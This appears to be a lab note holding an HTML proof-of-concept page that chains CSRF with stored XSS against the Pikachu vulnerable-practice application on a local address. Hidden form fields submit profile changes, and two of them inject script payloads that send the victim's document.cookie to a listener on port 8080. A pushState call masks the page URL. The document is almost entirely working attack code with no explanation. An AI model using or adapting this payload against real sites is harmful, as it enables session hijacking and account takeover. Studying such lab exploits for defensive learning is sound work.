[xss-csrf.html](https://www.yuque.com/attachments/yuque/0/2025/html/26698826/1751776858687-064b3c53-49a3-4158-9697-8320ff7cdad6.html)

```python
<html>
<body>
<form action="http://192.168.0.215/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=&amp;submit=submit" method="GET" name="form1"  >
<input type="hidden" name="sex" value="1"/>
<input type="hidden" name="phonenum" value="1"/>
<input type="hidden" name="add" value='<script>new Image().src="http://192.168.0.215:8080/?c="+document.cookie;</script>'/>
<input type="hidden" name="email" value='<script>new Image().src="http://192.168.0.215:8080/?c="+document.cookie;</script>'/>
<input type="hidden" name="submit" value="submit"/>
<input type="submit" value="Submit request" />
</form>
<script>history.pushState('', '', '/');</script>
</body>
</html>
```

